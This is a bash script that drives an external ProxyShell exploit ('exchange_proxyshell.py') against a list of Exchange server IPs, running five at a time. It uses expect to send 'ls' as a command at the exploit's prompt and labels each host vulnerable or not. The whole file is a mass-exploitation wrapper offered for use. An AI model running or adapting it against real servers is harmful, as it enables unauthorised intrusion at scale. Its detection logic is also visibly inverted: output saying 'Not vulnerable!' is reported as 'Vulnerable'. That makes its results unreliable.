#!/bin/bash

# Replace 'exchange_proxyshell.py' with the actual name of your Python script

# Check if the servers file argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <servers_file>"
    exit 1
fi

# Number of parallel processes
MAX_PARALLEL=5
# Array to hold PIDs
PIDS=()

servers_file="$1"

# Check if the servers file exists
if [ ! -f "$servers_file" ]; then
    echo "Servers file '$servers_file' not found."
    exit 1
fi

# Read IP addresses from the file and iterate
while IFS= read -r ip; do
    (
        output=$(expect -c "
            spawn python3 exchange_proxyshell.py -u https://$ip
            expect {
                \"*Please enter your email*\" {
                    send \"ls\n\"
                    exp_continue
                }
                \"Connection reset by peer\" {
                    exit 1
                }
            }
            interact
        " 2>&1)
        
        if ! echo "$output" | grep -qE "[-] Not vulnerable!"; then
            if ! echo "$output" | grep -qE "User has insufficient permissions|Connection reset by peer"; then
                echo "IP: $ip - Not vulnerable"
            else
                echo "IP: $ip - Vulnerable"
            fi
        else
            echo "IP: $ip - Vulnerable"
        fi
    ) &
    
    # Store the PID of the background process
    PIDS+=($!)
    
    # If the number of PIDs is greater or equal to MAX_PARALLEL, wait for them to finish
    if [ ${#PIDS[@]} -ge $MAX_PARALLEL ]; then
        wait "${PIDS[@]}"
        # Clear the array
        PIDS=()
    fi
done < "$servers_file"

# Wait for any remaining background processes to finish
wait "${PIDS[@]}"

